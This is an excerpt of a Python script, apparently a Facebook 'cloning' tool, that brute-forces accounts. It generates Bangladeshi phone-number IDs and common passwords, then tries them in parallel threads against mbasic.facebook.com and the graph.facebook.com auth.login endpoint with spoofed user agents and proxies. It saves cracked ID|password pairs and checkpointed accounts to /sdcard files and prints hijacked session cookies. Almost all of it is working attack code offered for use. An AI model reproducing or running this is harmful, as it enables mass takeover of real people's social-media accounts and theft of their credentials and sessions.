...
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; M2004J19C Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36 YaApp_Android/9.85 YaSearchBrowser/9.85"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/533.1.1 (KHTML, like Gecko) Chrome/38.0.867.0 Safari/533.1.1"}
header_grup = {"user-agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_3)  AppleWebKit/535.1.2 (KHTML, like Gecko) Chrome/21.0.878.0 Safari/535.1.2"}
...
def RXS():
	...
	print("[\033[1;36mA\033[1;37m] BD RANDOM CLONING ")
	print("[\033[1;36mB\033[1;37m] FILE CLONING ")
	...
	if opt =='B':
		clear()
		print('\x1b[92m══════════════════════════════════════════════\x1b[97m')
		file = input(f' \x1b[92mPUT FILE PATH: \033[1;37m')
		print("\x1b[92m══════════════════════════════════════════════\x1b[97m")
		try:
			...
			exit()
		print(f' \033[1;96m[\033[1;32m1\033[1;96m] \033[1;93mMETHOD A [MIX] \n \033[1;96m[\033[1;32m2\033[1;96m] METHOD B [MIX] \n \033[1;96m[\033[1;32m3\033[1;96m] \033[1;94mMETHOD C [NEW]')
		print('\x1b[92m══════════════════════════════════════════════\x1b[97m')
		...
		with tred(max_workers=30) as crack_submit:
			...
			print(f"\033[1;36m USE AIRPLANE MODE FOR SPEED UP\033[1;37m")
			linex()
			for user in fo:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [RXS-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        RXS=session.cookies.get_dict().keys()
                        if "c_user" in RXS:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [RXS-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/RXS-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in RXS:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [RXS-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/RXS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def ffb1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [RXS-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				head = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","X-Fb-Privacy-Context": "2368177546817046","X-Graphql-Client-Library": "graphservice","X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE","X-Graphql-Request-Purpose": "fetch","X-Fb-Background-State": "1","User-Agent": rxs_ua,"X-FB-Net-HNI": "41001","X-FB-SIM-HNI": "41001","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9","x-fb-device-group": "4481","X-FB-Friendly-Name": "SuggestionsFriendListContentQuery","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "ef0e330bff1cd312f36aa5f2c69c59a9","Connection": "Keep-Alive"}
				url = 'https://graph.facebook.com/method/auth.login'
				po = requests.post(url,data=data,headers=head,allow_redirects=False).text
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [RXS-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/RXS-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [RXS-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/RXS-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/RXS-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [RXS-M3] \033[1;36m-\033[1;37m %s \033[1;36m-\033[1;37m OK \033[1;36m-\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in RXS:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [RXS\033[1;36m-\033[1;37m\033[1;32mOK] %s \033[1;36m-\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/RXS-OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in RXS:
                                if 'y' in pcp:
...
def virus2():
	...
	print(logo)
	print('\x1b[92m══════════════════════════════════════════════\x1b[97m')
	print("[\033[1;92m𝜩\033[1;97m]SIM CODE EXAMPLE : 016, 017, 018, 019")
	kode = input('\033[1;92m[𝜩] ENTER SIM CODE: \033[1;97m')
	doamin ='BD RANDOM CLONE '
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		print(f"\033[1;97m [\033[1;92m𝜩\033[1;97m]  TOOL TYPE:\033[1;97m {doamin}")
		...
		for guru in user:
			...
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ','freefire','Free Fire''free fire','fflover','ffking','ffqueen','pubg','Pubg King','pubgqueen','pubgking','pubglover','@@@###','Bangla','bangla']
	...
	print('\x1b[92m══════════════════════════════════════════════\x1b[97m')
	input('\033[1;32mPRESS ENTER TO GO BACK TO MAIN MENU\033[1;37m')
	RXS()
def b(uid,pwx,tl):
    global loop
    global cps    
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mRXS-XD\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/?li=M_FMZPQDtUrZZ-CY28HLNnun&e=1348029&shbl=1&ref=dbl&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb,proxies=proxs).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\033[1;92m [RXS-OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;97m [🚀] Number : {uid}')
                print(f'\r\033[1;96m [🍪] COOKIE : '+coki)
                print(f'\r\033[1;95m [👥] USER AGENT : '+pro+'\033[1;93m')
